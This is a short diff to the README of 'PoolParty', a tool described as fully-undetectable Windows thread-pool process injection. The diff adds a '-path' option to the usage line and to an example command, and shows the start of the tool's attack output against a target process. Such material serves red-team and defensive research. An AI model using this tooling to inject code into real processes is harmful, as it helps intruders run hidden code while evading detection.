@@ -17,14 +17,14 @@ A collection of fully-undetectable process injection techniques abusing Windows 
 
 ## Usage
 ```
-PoolParty.exe -V <VARIANT ID> -P <TARGET PID>
+PoolParty.exe -V <VARIANT ID> -P <TARGET PID> -path <ABSOLUTE PATH TO PROGRAM TO EXECUTE>
 ```
 
 ## Usage Examples
 
 Insert TP_TIMER work item to process ID 1234
 ```
->> PoolParty.exe -V 8 -P 1234
+>> PoolParty.exe -V 8 -P 1234 -path C:\Users\User\Download\program.exe
 
 [info]    Starting PoolParty attack against process id: 1234
 [info]    Retrieved handle to the target process: 00000000000000B8
